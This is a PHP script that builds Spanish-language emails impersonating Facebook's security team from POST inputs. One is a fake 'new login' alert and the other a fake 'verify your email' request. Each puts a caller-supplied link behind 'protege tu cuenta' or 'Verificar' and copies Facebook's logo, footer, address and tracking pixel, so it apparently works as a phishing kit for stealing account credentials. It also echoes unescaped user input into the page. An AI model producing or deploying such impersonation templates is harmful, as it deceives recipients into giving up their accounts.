<?php
	$email  = $_POST['email'];
	$nombre = $_POST['nombre'];
	$imagen = $_POST['imagen'];
	$hora   = $_POST['hora'];
	$tipo   = $_POST['tipo'];
	$link	= $_POST['link'];
?>
<?php
	if($tipo == 1)
	{
		?>
			<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<title>Document</title>
			</head>
			<body>
				<div autoid="_rp_F" class="_rp_n5 rpHighlightAllClass rpHighlightBodyClass allowTextSelection" role="region" aria-label="Cuerpo del mensaje">   <div style="display: none;"></div> <div style="display: none;"></div>  <div>  <div class="_rp_o5 ms-font-weight-regular ms-font-color-neutralDark" role="presentation" tabindex="-1" id="Item.MessageNormalizedBody"><div class="rps_9ea1"><style type="text/css"><!-- .rps_9ea1 .x_d_mb_show
			{ display: none; }
			.rps_9ea1 .x_d_mb_show_center
			{ display: table; margin: auto; }
			.rps_9ea1 .x_mb_text h1, .rps_9ea1 .x_mb_text h2, .rps_9ea1 .x_mb_text h3, .rps_9ea1 .x_mb_text h4, .rps_9ea1 .x_mb_text h5, .rps_9ea1 .x_mb_text h6
			{ line-height: normal; }
			.rps_9ea1 .x_mb_work_text h1
			{ font-size: 18px; line-height: normal; margin-top: 4px; }
			.rps_9ea1 .x_mb_work_text h2, .rps_9ea1 .x_mb_work_text h3
			{ font-size: 16px; line-height: normal; margin-top: 4px; }
			.rps_9ea1 .x_mb_work_text h4, .rps_9ea1 .x_mb_work_text h5, .rps_9ea1 .x_mb_work_text h6
			{ font-size: 14px; line-height: normal; }
			.rps_9ea1 .x_mb_work_text a
			{ color: #1270e9; }
			.rps_9ea1 .x_mb_work_text p
			{ margin-top: 4px; }
			 --></style>
			<div>
			<div dir="ltr" style="margin:0; padding:0; background-color:#ffffff">
			<table border="0" width="100%;" cellspacing="0" cellpadding="0" id="x_email_table" style="border-collapse:collapse">
			<tbody>
			<tr>
			<td id="x_email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background:#ffffff">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="20" colspan="3" style="line-height:20px">&nbsp;</td>
			</tr>
			<tr>
			<td height="1" colspan="3" style="line-height:1px"><span style="color:#FFFFFF; display:none!important; font-size:1px">&nbsp; Hola,".$nombre.": se inicio sesion en tu cuenta de Facebook.&nbsp;</span></td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="16" colspan="3" style="line-height:16px">&nbsp;</td>
			</tr>
			<tr>
			<td width="32" align="left" valign="middle" style="height:32; line-height:0px"><div style="display: inline-block;">
			<div type="button" class="_at_6 o365button" aria-labelledby="_ariaId_553">
				<img src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_553" style="display: none;"></span>
			</div></div></div></td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td width="100%" style=""><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; font-size:19px; line-height:32px; color:#3b5998">Facebook</span></td>
			</tr>
			<tr style="border-bottom:solid 1px #e5e5e5">
			<td height="16" colspan="3" style="line-height:16px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="28" style="line-height:28px">&nbsp;</td>
			</tr>
			<tr>
			<td style="">
			<table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr>
			<td valign="top" style="padding-right:10px; font-size:0px"><div style="display: inline-block;">
			<div type="button" class="_at_6 o365button" aria-labelledby="_ariaId_554">
				<img src="<?php echo  $imagen?>" style="border:0; max-width:65px; max-height:70px" ><span class="_fc_3 owaimg" style="display:none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_554" style="display: none;"></span>
			</div></div></td>
			<td valign="top" style="width:100%">
			<table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse; font-size:14px; color:#3D4452; width:100%">
			<tbody>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-bottom:6px">
			Hola, <?php echo $nombre ?></td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			se inicio sesion en tu cuenta de Facebook el <?php echo $hora ?> (UTC-05).&nbsp;</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			<table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse; margin-top:5px; margin-bottom:5px">
			<tbody>
			<tr style="">
			<td style="padding-left:10px"><span style="color:#808080">Sistema operativo: </span></td>
			<td style="padding-left:10px">Windows</td>
			</tr>
			<tr style="">
			<td style="padding-left:10px"><span style="color:#808080">Navegador: </span></td>
			<td style="padding-left:10px">Chrome</td>
			</tr>
			<tr style="">
			<td style="padding-left:10px"><span style="color:#808080">Dirección IP: </span></td>
			<td style="padding-left:10px">187.170.205.195</td>
			</tr>
			<tr style="">
			<td style="padding-left:10px"><span style="color:#808080">Ubicación estimada: </span></td>
			<td style="padding-left:10px">Mexico City, DISTRITO FEDERAL, MX</td>
			</tr>
			</tbody>
			</table>
			</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			<strong>Si hiciste esto,</strong> puedes ignorar este mensaje. </td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			<strong>Si no hiciste esto,</strong> <a href="<?php echo $link ?>" target="_blank" style="color:#3b5998; text-decoration:none">protege tu cuenta</a>.</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			Gracias.<br>
			El equipo de seguridad de Facebook</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px">
			&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			</tr>
			</tbody>
			</table>
			</td>
			</tr>
			<tr style="">
			<td height="14" style="line-height:14px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="border-top:solid 1px #e5e5e5">
			<td height="16" style="line-height:16px">&nbsp;</td>
			</tr>
			<tr>
			<td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; font-size:11px; color:#aaaaaa; line-height:16px">
			Este mensaje se envió a <a href="mailto: <?php echo $email ?>  target="_blank" style="color:#3b5998; text-decoration:none"><?php echo $email ?></a>. Si no quieres recibir estos mensajes de Facebook en el futuro, <a href="https://www.facebook.com/o.php?k=AS014ETGIQSwG6q7&amp;u=100001365251992&amp;mid=54cebf489832bG5af361da5798G54cec3e1f85fdG18e" target="_blank" style="color:#3b5998; text-decoration:none">cancela tu suscripción</a>.<br>
			Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr style="">
			<td height="20" colspan="3" style="line-height:20px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			<span style=""><div style="display: inline-block;"><div type="button" class="_at_6 o365button" aria-disabled="true" aria-labelledby="_ariaId_555" disabled="true"><img src="https://www.facebook.com/email_open_log_pic.php?mid=54cebf489832bG5af361da5798G54cec3e1f85fdG18e" style="border:0; width:1px; height:1px"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_555" style="display: none;"></span></div></div></span></td>
			</tr>
			</tbody>
			</table>
			</div>

			</div>
			</div></div> <div style="display: none;"></div> </div> </div>
			</tbody>
			</table>
			</div>

			</div>
			</div></div> <div style="display: none;"></div> </div> </div></div> <div style="display: none;"></div> </div>
			</body>
			</html>

		<?php
	}
	else
	{
		if($tipo == 2)
		{
			?>
				<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<title>Document</title>
			</head>
			<body>
				<div autoid="_rp_F" class="_rp_n5 rpHighlightAllClass rpHighlightBodyClass allowTextSelection" role="region" aria-label="Cuerpo del mensaje">   <div style="display: none;"></div> <div style="display: none;"></div>  <div>  <div class="_rp_o5 ms-font-weight-regular ms-font-color-neutralDark" role="presentation" tabindex="-1" id="Item.MessageNormalizedBody"><div class="rps_9ea1"><style type="text/css"><!-- .rps_9ea1 .x_d_mb_show
			{ display: none; }
			.rps_9ea1 .x_d_mb_show_center
			{ display: table; margin: auto; }
			.rps_9ea1 .x_mb_text h1, .rps_9ea1 .x_mb_text h2, .rps_9ea1 .x_mb_text h3, .rps_9ea1 .x_mb_text h4, .rps_9ea1 .x_mb_text h5, .rps_9ea1 .x_mb_text h6
			{ line-height: normal; }
			.rps_9ea1 .x_mb_work_text h1
			{ font-size: 18px; line-height: normal; margin-top: 4px; }
			.rps_9ea1 .x_mb_work_text h2, .rps_9ea1 .x_mb_work_text h3
			{ font-size: 16px; line-height: normal; margin-top: 4px; }
			.rps_9ea1 .x_mb_work_text h4, .rps_9ea1 .x_mb_work_text h5, .rps_9ea1 .x_mb_work_text h6
			{ font-size: 14px; line-height: normal; }
			.rps_9ea1 .x_mb_work_text a
			{ color: #1270e9; }
			.rps_9ea1 .x_mb_work_text p
			{ margin-top: 4px; }
			 --></style>
			<div>
			<div dir="ltr" style="margin:0; padding:0; background-color:#ffffff">
			<table border="0" width="100%;" cellspacing="0" cellpadding="0" id="x_email_table" style="border-collapse:collapse">
			<tbody>
			<tr>
			<td id="x_email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background:#ffffff">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="20" colspan="3" style="line-height:20px">&nbsp;</td>
			</tr>
			<tr>
			<td height="1" colspan="3" style="line-height:1px"><span style="color:#FFFFFF; display:none!important; font-size:1px">&nbsp; Hola,".$nombre.": se inicio sesion en tu cuenta de Facebook el 11 de abril del 2017.&nbsp;</span></td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="16" colspan="3" style="line-height:16px">&nbsp;</td>
			</tr>
			<tr>
			<td width="32" align="left" valign="middle" style="height:32; line-height:0px"><div style="display: inline-block;">
			<div type="button" class="_at_6 o365button" aria-labelledby="_ariaId_553">
				<img src="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_553" style="display: none;"></span>
			</div></div></div></td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td width="100%" style=""><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; font-size:19px; line-height:32px; color:#3b5998">Facebook</span></td>
			</tr>
			<tr style="border-bottom:solid 1px #e5e5e5">
			<td height="16" colspan="3" style="line-height:16px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="">
			<td height="28" style="line-height:28px">&nbsp;</td>
			</tr>
			<tr>
			<td style="">
			<table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr>
			<td valign="top" style="padding-right:10px; font-size:0px"><div style="display: inline-block;">
			<div type="button" class="_at_6 o365button" aria-labelledby="_ariaId_554">
				<img src="<?php echo  $imagen?>" style="border:0; max-width:65px; max-height:70px" ><span class="_fc_3 owaimg" style="display:none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_554" style="display: none;"></span>
			</div></div></td>
			<td valign="top" style="width:100%">
			<table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse; font-size:14px; color:#3D4452; width:100%">
			<tbody>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-bottom:6px">
			Hola, <?php echo $nombre ?></td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			Por motivos de seguridad se requiere verificar tu correo electronico.</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			<strong>Protege tu cuenta</strong> <a href="<?php echo $link ?>" target="_blank" style="color:#3b5998; text-decoration:none">Verificar</a>.</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px">
			Gracias.<br>
			El equipo de seguridad de Facebook</td>
			</tr>
			<tr>
			<td style="font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px">
			&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			</tr>
			</tbody>
			</table>
			</td>
			</tr>
			<tr style="">
			<td height="14" style="line-height:14px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			<td style="">
			<table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse">
			<tbody>
			<tr style="border-top:solid 1px #e5e5e5">
			<td height="16" style="line-height:16px">&nbsp;</td>
			</tr>
			<tr>
			<td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; font-size:11px; color:#aaaaaa; line-height:16px">
			Este mensaje se envió a <a href="mailto: <?php echo $email ?>  target="_blank" style="color:#3b5998; text-decoration:none"><?php echo $email ?></a>. Si no quieres recibir estos mensajes de Facebook en el futuro, <a href="https://www.facebook.com/o.php?k=AS014ETGIQSwG6q7&amp;u=100001365251992&amp;mid=54cebf489832bG5af361da5798G54cec3e1f85fdG18e" target="_blank" style="color:#3b5998; text-decoration:none">cancela tu suscripción</a>.<br>
			Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td>
			</tr>
			</tbody>
			</table>
			</td>
			<td width="15" style="display:block; width:15px">&nbsp;&nbsp;&nbsp;</td>
			</tr>
			<tr style="">
			<td height="20" colspan="3" style="line-height:20px">&nbsp;</td>
			</tr>
			</tbody>
			</table>
			<span style=""><div style="display: inline-block;"><div type="button" class="_at_6 o365button" aria-disabled="true" aria-labelledby="_ariaId_555" disabled="true"><img src="https://www.facebook.com/email_open_log_pic.php?mid=54cebf489832bG5af361da5798G54cec3e1f85fdG18e" style="border:0; width:1px; height:1px"><span class="_fc_3 owaimg" style="display: none;"> </span><span class="_fc_4 o365buttonLabel" id="_ariaId_555" style="display: none;"></span></div></div></span></td>
			</tr>
			</tbody>
			</table>
			</div>

			</div>
			</div></div> <div style="display: none;"></div> </div> </div>
			</tbody>
			</table>
			</div>

			</div>
			</div></div> <div style="display: none;"></div> </div> </div></div> <div style="display: none;"></div> </div>
			</body>
			</html>
			<?php
		}
	}

	?>

	<button onclick="goBack()">Regresar</button>

	<script>
	function goBack() {
	    window.history.back();
	}
	</script>

			